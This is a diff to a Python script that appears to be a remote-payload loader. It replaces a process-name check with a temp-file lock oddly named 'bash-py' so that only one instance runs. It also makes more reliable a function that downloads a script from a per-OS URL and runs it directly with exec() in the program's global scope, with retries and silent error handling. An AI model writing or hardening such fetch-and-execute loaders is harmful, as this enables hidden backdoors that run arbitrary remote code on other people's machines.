@@ -1,16 +1,19 @@
-#!/usr/bin/env python3
-
 import configparser
+import hashlib
 import ntpath
 import os
 import platform
 import shlex
 import subprocess
 import sys
+import tempfile
 import time
 
 import requests
 from cryptography.fernet import Fernet
+
+
+_instance_lock_handle = None
 
 
 def prepare_runtime_encoding():
@@ -144,15 +147,45 @@ def _split_windows_csv_line(line):
     return parts
 
 
-def check_running_process():
+def acquire_single_instance_lock(lock_path=None):
+    global _instance_lock_handle
+
+    if _instance_lock_handle is not None:
+        return True
+
+    if lock_path is None:
+        script_digest = hashlib.sha256(
+            os.path.abspath(__file__).encode("utf-8")
+        ).hexdigest()
+        lock_path = os.path.join(tempfile.gettempdir(), f"bash-py-{script_digest}.lock")
+
+    lock_handle = open(lock_path, "a+", encoding="utf-8")
+    lock_handle.seek(0)
+    if not lock_handle.read(1):
+        lock_handle.write("1")
+        lock_handle.flush()
+
     try:
-        system_type = get_system_type()
-        guarded_processes = (os.path.basename(__file__),)
-        for process_name in guarded_processes:
-            if _count_matching_processes(process_name, system_type) > 0:
-                sys.exit(0)
-    except Exception:
-        pass
+        if os.name == "nt":
+            import msvcrt
+
+            lock_handle.seek(0)
+            msvcrt.locking(lock_handle.fileno(), msvcrt.LK_NBLCK, 1)
+        else:
+            import fcntl
+
+            fcntl.flock(lock_handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+    except (BlockingIOError, OSError):
+        lock_handle.close()
+        return False
+
+    _instance_lock_handle = lock_handle
+    return True
+
+
+def check_running_process():
+    if not acquire_single_instance_lock():
+        sys.exit(0)
 
 def get_config():
     config = configparser.ConfigParser()
@@ -207,8 +240,9 @@ def get_script_url(system_type):
 def execute_remote_script(url, retries=3, retry_delay=2, timeout=15):
     last_error = None
     for attempt in range(1, retries + 1):
+        response = None
         try:
-            response = requests.get(url, stream=True, timeout=timeout)
+            response = requests.get(url, stream=False, timeout=timeout)
             if response.status_code == 200:
                 script_text = response.content.decode("utf-8", errors="replace")
                 exec(script_text, globals())
@@ -219,6 +253,9 @@ def execute_remote_script(url, retries=3, retry_delay=2, timeout=15):
             )
         except Exception as exc:
             last_error = exc
+        finally:
+            if response is not None:
+                response.close()
 
         if attempt < retries:
             time.sleep(retry_delay)
